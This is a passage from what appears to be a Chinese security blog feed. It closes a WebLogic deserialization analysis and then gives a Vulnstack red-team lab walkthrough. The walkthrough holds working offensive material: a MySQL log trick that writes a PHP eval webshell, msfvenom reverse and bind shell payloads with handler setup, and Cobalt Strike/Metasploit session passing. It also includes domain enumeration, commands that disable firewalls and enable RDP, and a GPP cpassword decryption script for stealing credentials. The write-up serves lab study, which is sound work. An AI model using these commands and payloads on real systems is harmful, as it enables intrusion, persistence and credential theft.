alt="image-20211112155806888" style="zoom:80%;" /><p>然后程序就可以初始化任意<code>handle</code>类</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211113002831750.png" alt="image-20211113002831750"></p><p>其中<code>ShellSession</code>类的调用栈如下</p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211113002623429.png" alt="image-20211113002623429" style="zoom:80%;" /><p>其中<code>FileSystemXmlApplicationContext</code>类的调用栈如下</p><p>下载xml文件</p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211113015257300.png" alt="image-20211113015257300" style="zoom:80%;" /><p>解析xml文件</p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211113015841997.png" alt="image-20211113015841997" style="zoom:80%;" /><p><strong>patch</strong></p><ol><li><p>官方对CVE-2020-14883的补丁是在com\bea\console\handles\HandleFactory#getHandle的方法中对传入的类的类型进行检查，是否为handle的子类。这里通过handle实现类<code>com.bea.console.handles.HandleImpl</code>的子类<code>com.bea.console.handles.JndiBindingHandle</code>的接收String的构造方法将jndi的url作为payload传入；单独这一点并不能实现RCE（之前虽然知道补丁的修复方式但是觉得单独这个无法RCE就没细看，谁知道可以结合其他点来实现RCE）。 </p></li><li><p>在com.bea.console.actions.jndi.JNDIBindingAction#execute方法中，构造了JndiBindingHandle对象，并通过获取jndi的payload，并进行了特定的拼接（这里根据其拼接方式进行特殊构造），调用javax.naming.Context#lookup实现了jndi注入导致的RCE。</p></li></ol><h2 id="回显构造"><a href="#回显构造" class="headerlink" title="回显构造"></a>回显构造</h2><p>具体参考一下@Y4er师傅的<a href="https://y4er.com/post/java-deserialization-echo/">文章</a></p><ol><li>defineClass</li><li>RMI绑定实例</li><li>URLClassLoader抛出异常</li><li>中间件</li><li>写文件css、js</li><li>dnslog</li></ol><h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><ol><li>只有实现了Serializable接口或Externalizable接口的类才能进行序列化</li><li>被transient和static修饰的变量不参与修饰符，其值为null</li><li>readResolve()方法如果被定义会在readObject()方法后被调用，修改反序列化的对象</li><li>Externalizable接口定义了writeExternal()和readExternal()方法，对应Serializable接口的writeObject()和readObject()方法</li><li>历史漏洞梳理，大部分新漏洞的造成都是对黑名单的绕过：<ul><li>CVE-2015-4852、CVE2016-0638、CVE-2016-3510、CVE-2019-2890都是直接搜索能对ObjectInputStream直接进行操作的readObject()或者readExternal()方法</li><li>CVE-2017-3248、CVE-2018-2628、CVE-2018-2893、CVE-2018-3245主要在RMI的前提下不断搜索RemoteObject相似子类来绕过，或者是直接绕过resolveProxyClass()的检查</li><li>CVE-2020-2551运用T3协议和IIOP协议之间的差异进行绕过，关键的地方就是T3的resolveClass()方法会检查其父类，而IIOP的resolveClass()只会检查其本身类</li><li>CVE-2020-2555、CVE-2020-2883、CVE-2020-14645挖掘出了一条新的extractor反射链并不断搜索能够调用此方法的相似类进行绕过</li><li>CVE-2020-14644通过defineClass()来加载我们的恶意类，这是一个很巧妙的思路</li><li>CVE-2017-3506、CVE-2017-10271、CVE-2019-2725、CVE-2019-2729是根据对标签的差异解析进行绕过，这需要对源码进行深入解读才可以</li></ul></li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/TheTh1nk3r/articles/14506947.html">java反序列化漏洞（1）之反射机制</a></p><p><a href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/">Java反序列 Jdk7u21 Payload 学习笔记</a></p><p><a href="https://cloud.tencent.com/developer/article/1516342">Weblogic反序列化历史漏洞全汇总</a></p><p><a href="https://www.anquanke.com/post/id/219985">CVE-2015-4852——WebLogic反序列化初探</a></p><p><a href="https://xz.aliyun.com/t/8443">从Weblogic原理上探究CVE-2015-4852、CVE-2016-0638、CVE-2016-3510究竟怎么一回事</a></p><p><a href="https://www.freebuf.com/column/203816.html">CVE-2017–10271漏洞原理分析</a></p><p><a href="https://www.cnblogs.com/afanti/p/10222293.html">weblogic远程调试XMLDecoder RCE CVE-2017-10271</a></p><p><a href="http://xxlegend.com/2019/04/30/CVE-2019-2725%E5%88%86%E6%9E%90/">CVE-2019-2725分析</a></p><p><a href="http://galaxylab.pingan.com.cn/weblogic-cve-2019-2725%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">WebLogic | CVE-2019-2725反序列化漏洞分析</a></p><p><a href="https://www.anquanke.com/post/id/225137#h3-5">CVE-2017-3248——WebLogic反序列化初探</a></p><p><a href="https://xz.aliyun.com/t/8073">CVE-2018-2628 Weblogic反序列化漏洞分析</a></p><p><a href="https://www.anquanke.com/post/id/152164">CVE-2018-2893：Oracle WebLogic Server 远程代码执行漏洞分析预警</a></p><p><a href="https://xz.aliyun.com/t/2479">Weblogic JRMP反序列化漏洞回顾</a></p><p><a href="https://kylingit.com/blog/cve-2019-2729-weblogic-xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2019-2729 WEBLOGIC XMLDECODER反序列化漏洞分析</a></p><p><a href="https://xz.aliyun.com/t/6904">Weblogic-T3-CVE-2019-2890-Analysis</a></p><p><a href="https://paper.seebug.org/1321/#cve-2020-2555">Weblogic12c T3 协议安全漫谈</a></p><p><a href="https://www.anquanke.com/post/id/213074">Weblogic 远程命令执行漏洞（CVE-2020-14644）分析</a></p><p><a href="https://www.anquanke.com/post/id/213248">Weblogic 远程命令执行漏洞（CVE-2020-14645）分析</a></p><p><a href="https://xz.aliyun.com/t/7422">CVE-2020-2551: Weblogic IIOP反序列化漏洞分析</a></p><p><a href="https://www.anquanke.com/post/id/221752">CVE-2020-14882：Weblogic Console 权限绕过深入解析</a></p><p><a href="https://f5.pm/go-60295.html">Weblogic Console漏洞分析</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> WebLogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnstack 红队实战</title>
      <link href="/2020/12/17/Vulnstack-%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98/"/>
      <url>/2020/12/17/Vulnstack-%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<blockquote><p>找个时间简单学习一下内网渗透</p></blockquote><span id="more"></span><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶机地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/">http://vulnstack.qiyuanxuetang.net/vuln/</a></p><blockquote><p>建议使用百度云盘联动IDM下载</p></blockquote><p>靶机环境一共包括三台靶机，环境配置如下：</p><ol><li>Web服务器：win7（Windows 7 x64）<ul><li>网卡1：Host-Only</li><li>网卡2：NAT</li></ul></li><li>域成员：winserver 2003（Win2K3 Metasploitable）<ul><li>网卡1：Host-Only</li></ul></li><li>域控：winserver 2008（Windows Server 2008 R2 x64）<ul><li>网卡1：Host-Only</li></ul></li></ol><p>其网络拓扑如下：</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715371ccb488fef94c218bd76.png" alt="image-20201214095301999" style="zoom: 50%;" /><p>搭建完成后，打开三个靶机，密码均为 <code>hongrisec@2019</code>，部分提示需要更新密码</p><p>然后进入win7启动phpStudy，我一开始打开是<code>KERNELBASE.dll</code>模块报错，Google了一下据说是因为dll编译错误，但是搜不到方法，然后我后面把备份的phpStudy恢复回来以后又可以启动了 : &gt;</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171538b35324abd3a58b69a20e.png" alt="image-20201214154411573"></p><p>发现三台靶机的内网网段在<code>192.168.52.0/24</code>，然后我这里的Web服务器的外网IP为<code>192.168.140.144</code></p><p>测试三台靶机都能互相ping同则表示搭建完成，ping不通的检测一下网段和网关是否正确，防火墙是否关闭</p><h2 id="攻击Web服务器"><a href="#攻击Web服务器" class="headerlink" title="攻击Web服务器"></a>攻击Web服务器</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>主机探测</p><pre><code class="shell">nmap -sP 192.168.140.0/24</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171538b35324abd3a58b69a20e.png" alt="image-20201214142412646"></p><p>端口扫描，建议masscan和nmap联动</p><pre><code class="shell">▶ sudo masscan -e eth0 -p0-65535 --max-rate 500 192.168.140.144Starting masscan 1.0.6 (http://bit.ly/14GZzcT) at 2020-12-14 06:31:45 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-ethInitiating SYN Stealth ScanScanning 1 hosts [65536 ports/host]Discovered open port 135/tcp on 192.168.140.144Discovered open port 1029/tcp on 192.168.140.144Discovered open port 3306/tcp on 192.168.140.144Discovered open port 139/tcp on 192.168.140.144Discovered open port 1026/tcp on 192.168.140.144Discovered open port 1538/tcp on 192.168.140.144Discovered open port 1028/tcp on 192.168.140.144Discovered open port 1025/tcp on 192.168.140.144Discovered open port 1027/tcp on 192.168.140.144Discovered open port 445/tcp on 192.168.140.144Discovered open port 80/tcp on 192.168.140.144</code></pre><pre><code class="shell">▶ nmap -p80,135,139,445,1025,1026,1027,1028,1029,1538,3306 -sV -sC -oA nmap 192.168.140.144Starting Nmap 7.60 ( https://nmap.org ) at 2020-12-14 14:39 CSTNmap scan report for stu1 (192.168.140.144)Host is up (0.00091s latency).PORT     STATE SERVICE      VERSION80/tcp   open  http         Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45|_http-title: phpStudy \xE6\x8E\xA2\xE9\x92\x88 2014135/tcp  open  msrpc        Microsoft Windows RPC139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: GOD)1025/tcp open  msrpc        Microsoft Windows RPC1026/tcp open  msrpc        Microsoft Windows RPC1027/tcp open  msrpc        Microsoft Windows RPC1028/tcp open  msrpc        Microsoft Windows RPC1029/tcp open  msrpc        Microsoft Windows RPC1538/tcp open  msrpc        Microsoft Windows RPC3306/tcp open  mysql        MySQL (unauthorized)Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_nbstat: NetBIOS name: STU1, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:13:7b:ad (VMware)| smb-os-discovery:|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional|   Computer name: stu1|   NetBIOS computer name: STU1\x00|   Domain name: god.org|   Forest name: god.org|   FQDN: stu1.god.org|_  System time: 2020-12-14T14:40:35+08:00| smb-security-mode:|   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-security-mode:|   2.02:|_    Message signing enabled but not required| smb2-time:|   date: 2020-12-14 14:40:35|_  start_date: 2020-12-14 13:28:52Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 70.65 seconds</code></pre><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>开了80和3306端口，3306没有开启远程连接，进去80看看，是一个php探针页面，可以看到是一个phpStudy的集成环境，显示出了绝对路径<code>C:/phpStudy/WWW</code>，测试Mysql连接可以盲猜出一个弱密码<code>root:root</code></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715420522560ff952f1107c43.png" alt="image-20201214141700672"></p><p>用强大的dirmap扫一波后台目录，发现<code>phpMyAdmin</code>和一个yxcms的备份文件<code>beifen.rar</code>（有的字典会没有，比如dirsearch）</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20201217154300e8da1adcb1e32f9d87.png" alt="image-20201214154701862"></p><h3 id="弱密码"><a href="#弱密码" class="headerlink" title="弱密码"></a>弱密码</h3><p>到这里我们可以尝试检测以下服务的弱密码：</p><ol><li>yxcms后台弱密码</li><li>phpMyAdmin后台弱密码</li></ol><p><strong>yxcms弱密码</strong></p><p>查看网站或者数据库配置文件，可以直接在备份文件中找到yxcms的默认后台密码</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171543c550e5847e4336055053.png" alt="image-20201214155418319"></p><p>网上搜搜yxcms后台地址为<code>http://xxx.xxx.xxx.xxx/yxcms/index.php?r=admin/index/login</code>，直接登进去</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171543f6d76730cd186e7ef62e.png" alt="image-20201214155955610"></p><p><strong>phpMyAdmin弱密码</strong></p><p>先试一试通用密码<code>root:(NULL)</code>和<code>root:root</code>，不行就用脚本爆破，这里是<code>root:root</code>直接进去了</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171543e3cd90fbb0182b33342d.png" alt="image-20201214162146967"></p><h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><p>到这里我们可以考虑以下攻击方法：</p><ol><li>phpStudy后门</li><li>phpMyAdmin后台写shell</li><li>yxcms后台写shell</li></ol><p>尝试了一下phpStudy后门，利用失败</p><p><strong>1. phpMyAdmin利用Mysql日志写shell</strong></p><pre><code>show variables like &#39;%general%&#39;;set global general_log = on;set global general_log_file = &#39;C:/phpStudy/WWW/shell.php&#39;;select &#39;&lt;?php @eval($_REQUEST[&quot;kk&quot;]);?&gt;&#39;&#39;;set global general_log_file = &#39;C:/phpStudy/MySQL/data/stu1.log&#39;;set global general_log = off;</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171543e3cd90fbb0182b33342d.png" alt="image-20201214165117322"></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171543eb5a44893be1b43f77e8.png" alt="image-20201214165140607"></p><p><strong>2. yxcms后台直接修改php前台模板</strong></p><p>yxcms</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171543c6b75b00e17b6f223051.png" alt="image-20201214164700518"></p><p>到备份文件找找路径就好</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20201217154341abb077a0a60a1a0060.png" alt="image-20201214164844080"></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="连上Cobalt-Strike"><a href="#连上Cobalt-Strike" class="headerlink" title="连上Cobalt Strike"></a>连上Cobalt Strike</h3><p>用antsword连上一句话，上传beacon.exe反弹到CS</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715430f242f6c6f789b50481d.png" alt="image-20201214232111140"></p><p>因为没有杀软，为了方便测试，我把sleep值直接调成0</p><pre><code>beacon&gt; sleep  0</code></pre><h4 id="正反向shell"><a href="#正反向shell" class="headerlink" title="正反向shell"></a>正反向shell</h4><blockquote><p>MSF遇到中文乱码：chcp 65001</p></blockquote><p><strong>反向shell</strong></p><pre><code class="cmd">msfvenom -p windows/meterpreter/reverse_tcp lport=&lt;your port&gt; lhost=&lt;your host&gt;  -f exe -o torjan.exe</code></pre><p>Metasploit里</p><pre><code class="cmd">use exploit/multi/handlerset payload  windows/meterpreter/reverse_tcpset lhost &lt;your host&gt;set lport &lt;your port&gt;exploit</code></pre><p><strong>正向shell</strong></p><pre><code class="cmd">msfvenom -p windows/meterpreter/bind_tcp lport=&lt;victim port&gt; -f exe -o torjan.exe</code></pre><p>Metasploit 里</p><pre><code class="cmd">use exploit/multi/handlerset payload windows/meterpreter/bind_tcpset lport &lt;victim port&gt;set rhost &lt;victim host&gt;exploit -j</code></pre><h4 id="MSF转CS"><a href="#MSF转CS" class="headerlink" title="MSF转CS"></a>MSF转CS</h4><p>CS里</p><pre><code>msf添加地址为&lt;host&gt;:&lt;port&gt;的windows/beacon/reverse_http的监听器</code></pre><p>MSF里</p><pre><code class="shell">backgrounduse exploit/windows/local/payload_injectset payload windows/meterpreter/reverse_httpset lhost &lt;host&gt;set lport &lt;port&gt;set session 1set disablepayloadhandler true # 禁用 payload handler的监听否则有冲突exploit -j</code></pre><h4 id="CS转MSF"><a href="#CS转MSF" class="headerlink" title="CS转MSF"></a>CS转MSF</h4><p>MSF里</p><pre><code>use exploit/multi/handler set payload windows/meterpreter/reverse_httpset lhost &lt;host&gt;set lport &lt;port&gt;exploit</code></pre><p>CS里</p><pre><code>spawn一个地址为&lt;host&gt;:&lt;port&gt;的windows/foreign/reverse_http</code></pre><h3 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h3><p>查看当前用户和权限</p><pre><code>whoami</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715388a0b318c0aa4e0d8cffc.png" alt="image-20201215142606557"></p><p>查看有哪些用户</p><pre><code>net user</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715381d341d0eefc9ca772659.png" alt="image-20201215142617687"></p><p>获取域SID、组信息、特权等信</p><pre><code>whoami /all</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715430f5693d58f11ea66760e.png" alt="image-20201215142641103"></p><p>查看指定账户的详细信息</p><pre><code>net user Administrtor /domain</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715442fe3b6ab842fd4a6f231.png" alt="image-20201215142813124"></p><p>查看本机管理员（通常会包含有域用户）</p><pre><code>net localgroup administrators</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715443cedaab5e5e4eaf4f2cc.png" alt="image-20201215142847663"></p><p>查看当前在线的用户（防止踢别人下线）</p><pre><code>query user || qwinsta</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715447e9847d50026a44135d0.png" alt="image-20201215143036818"></p><p>查询网络信息</p><pre><code>ipconfig /all</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171544d3fa5fb4830db592c798.png" alt="image-20201215143122063"></p><p>查看系统详细信息</p><pre><code>systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171544fa75943ccd6d74dd7712.png" alt="image-20201215143137704"></p><p>查询系统体系架构</p><pre><code>echo %PROCESSOR_ARCHITECTURE%</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171544396e0421613ca864e5f2.png" alt="image-20201215143151701"></p><p>查询已安装的软件及版本信息</p><blockquote><p>在win10中，输入<code>wmic /?</code>会提示wmic已弃用，但在server2012R2、win7等版本中可以正常使用</p><p>powershell中可替代该命令的是<code>Get-WmiObject</code></p></blockquote><pre><code>wmic product get name,versionGet-WmiObject -class win32_product | Select-Object -property name,version</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171544b127523ec9f14ae3055f.png" alt="image-20201215143212494"></p><p>端口及网络连接情况查看</p><blockquote><p>如果这台主机是台代理服务器，则会有很多IP来连接他的代理端口；</p><p>如果是台用来更新的服务器，例如WSUS，则他可能会开放一个8530端口（WSUS是Windows Server Update Services的简称）；</p><p>如果是DNS服务器则可能开着53端口；</p><p>如果这台主机可以访问外网，同时发现这里存在大量powershell进程在向外进行连接，则多半可以判断该主机为沦陷的肉鸡。</p></blockquote><pre><code>netstat -ano</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715449da0fae3118570a2ee7d.png" alt="image-20201215143337375"></p><p>查看补丁情况</p><blockquote><p>如果systeminfo后，最下面的“登录服务器”字段值为”WORDGROUP”则说明此电脑不在域内</p></blockquote><pre><code>systeminfo</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715445e011aba7b435f570a7c.png" alt="image-20201215143505866"></p><p>查看本机共享</p><pre><code>net sharewmic share get name,path,status</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171546b0b5dab6942a67340599.png" alt="image-20201215143531715"></p><p>查看指定主机的共享</p><pre><code>net view 127.0.0.1</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20201217154494f29d8ffb3b551a7370.png" alt="image-20201215143549978"></p><p>查看远程连接端口</p><pre><code>reg query &quot;hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\RDP-Tcp&quot;  /v  portnumber</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171546625626766ee8fbe6738b.png" alt="image-20201215143639065"></p><p>查看进程列表</p><pre><code>tasklist  /vwmic process list brief</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171544053ba800b87a343868f0.png" alt="image-20201215143658031"></p><p><strong>常见的杀软进程</strong></p><table><thead><tr><th>进程名</th><th>软件</th></tr></thead><tbody><tr><td>360sd.exe</td><td>360 杀毒</td></tr><tr><td>360tray.exe</td><td>360 实时保护</td></tr><tr><td>ZhuDongFangYu.exe</td><td>360 主动防御</td></tr><tr><td>KSafeTray.exe</td><td>金山卫士</td></tr><tr><td>SafeDogUpdateCenter.exe</td><td>安全狗</td></tr><tr><td>McAfee</td><td>McShield.exe</td></tr><tr><td>egui.exe</td><td>NOD32</td></tr><tr><td>AVP.exe</td><td>卡巴斯基</td></tr><tr><td>avguard.exe</td><td>小红伞</td></tr><tr><td>bdagent.exe</td><td>BitDefender</td></tr></tbody></table><p>查询并开启远程连接端口</p><pre><code class="cmd"># Windows Server 2008 &amp; 2012打开3389：wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot;  /v  fSingleSessionPerUser   /t  REG_DWORD  /d  0  /f# Windows Server 2003打开3389wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;)   call  setallowtsconnections 1</code></pre><h3 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h3><p>查看时间服务器</p><blockquote><p>如果能够执行，说明此台机器在域中 (若是此命令在显示域处显示 WORKGROUP，则不存在域，若是报错：发生系统错误，则存在域，但该用户不是域用户)</p></blockquote><pre><code>net time /domain</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171544551328cc426628aa0ed0.png" alt="image-20201215143959438"></p><p>查询当前的登录域与用户信息</p><pre><code>net config workstation</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171545e3e8772bb343ed8cd485.png" alt="image-20201215144022866"></p><p>查找域控</p><pre><code>nslookup god.org</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171545560d88112a288beda7c5.png" alt="image-20201215144044940"></p><p>查询域控和用户信息</p><pre><code>net user /domainwmic useraccount get /all</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20201217154516ce30f424f6bbc6d750.png" alt="image-20201215144102038"></p><p>查看所有域成员计算机列表</p><pre><code>net group &quot;domain computers&quot; /domain</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20201217154530818f11f60a3af2b75b.png" alt="image-20201215144115674"></p><p>查看域管理员</p><pre><code>net group &quot;domain admins&quot; /domain</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715453e75c05153286dca038e.png" alt="image-20201215144132622"></p><p>获取域密码信息</p><pre><code>net accounts /domain</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171545bbacb8bc4db0c7ba4071.png" alt="image-20201215144145062"></p><p>获取域信任信息</p><pre><code>nltest /domain_trusts</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171545319f74eb8ced0ad67f97.png" alt="image-20201215144206756"></p><h3 id="防火墙设置"><a href="#防火墙设置" class="headerlink" title="防火墙设置"></a>防火墙设置</h3><p>查看防火墙配置</p><pre><code>netsh firewall show config</code></pre><p>设置防火墙日志存储位置</p><pre><code>netsh advfirewall set currentprofile logging filename &quot;C:\Windows\temp\FirewallLOG.log</code></pre><p>关闭防火墙</p><pre><code># before windows 2003netsh firewall get opmode disable # after windows 2003netsh advfirewall set allprofiles state off</code></pre><p>修改防火墙配置</p><pre><code># before Windows 2003# 允许某个程序的全连接netsh firewall add allowdprogram C:\nc.exe &quot;allow nc&quot; enable# after windows 2003# 允许某个程序连入netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;# 允许某个程序外连netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;# 开放3389端口netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</code></pre><h3 id="横向探测"><a href="#横向探测" class="headerlink" title="横向探测"></a>横向探测</h3><h4 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h4><p>使用<code>net view</code>查看目标内网情况和端口开放情况</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171545481ffe4537dd8ea9a7b4.png" alt="image-20201215144454184"></p><p>上方点击<code>目标视图</code>的快捷键查看内网主机</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715450a7954fd957612f7a2db.png" alt="image-20201215144557042"></p><p>探测其他主机</p><pre><code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr &quot;TTL=&quot;</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171540d9e2032e4cb5da82dc4f.png" alt="image-20201215153640858"></p><p>最简单的直接 <code>arp -a</code> 查看也可以，这里还推荐一个好用工具 <a href="https://github.com/k8gege/Ladon">Ladon</a>，下载完在脚本管理器添加<code>Lodan.cna</code>即可</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2020121715409849cc073541a580feda.png" alt="image-20201215150349091"></p><p>然后就能直接使用了</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171546478cc292e2bc3d405416.png" alt="image-20201215150438617"></p><p>扫描网段内存活主机信息</p><pre><code>Ladon 192.168.52.0/24 OsScan</code></pre><blockquote><p>另外推荐<a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a>这款域渗透分析工具</p><p>BloodHound 是一种单页的 JavaScript 的 Web 应用程序，构建在 Linkurious 上，用 Electron 编译，NEO4J 数据库 PowerShell/C# ingestor.BloodHound 使用可视化图来显示 Active Directory 环境中隐藏的和相关联的主机内容。攻击者可以使用 BloodHound 轻松识别高度复杂的攻击路径，否则很难快速识别。防御者可以使用 BloodHound 来识别和防御那些相同的攻击路径。蓝队和红队都可以使用 BloodHound 轻松深入了解 Active Directory 环境中的权限关系。</p></blockquote><h4 id="抓密码"><a href="#抓密码" class="headerlink" title="抓密码"></a>抓密码</h4><p>gpp目录找账号</p><pre><code class="cmd"># 列目录shell dir \\域名\sysvol\域名\# 查文件shell findstr /s /i /m /c:&quot;password&quot; \\域名\SYSVOL\域名\Policies*.xml</code></pre><p>密码解密脚本</p><pre><code class="python">import sysfrom Crypto.Cipher import AESfrom base64 import b64decodekey = &quot;&quot;&quot;4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b&quot;&quot;&quot;.replace(&quot; &quot;,&quot;&quot;).replace(&quot;\n&quot;,&quot;&quot;).decode(&#39;hex&#39;)cpassword = &quot;加密的字符串&quot;cpassword += &quot;=&quot; * ((4 - len(cpassword) % 4) % 4)password = b64decode(cpassword)o = AES.new(key, AES.MODE_CBC, &quot;\x00&quot; * 16).decrypt(password)print o[:-ord(o[-1])].decode(&#39;utf16&#39;)</code></pre><p>使用<code>hashdump</code>读取内存密码</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171539b7f45d211df843387dc9.png" 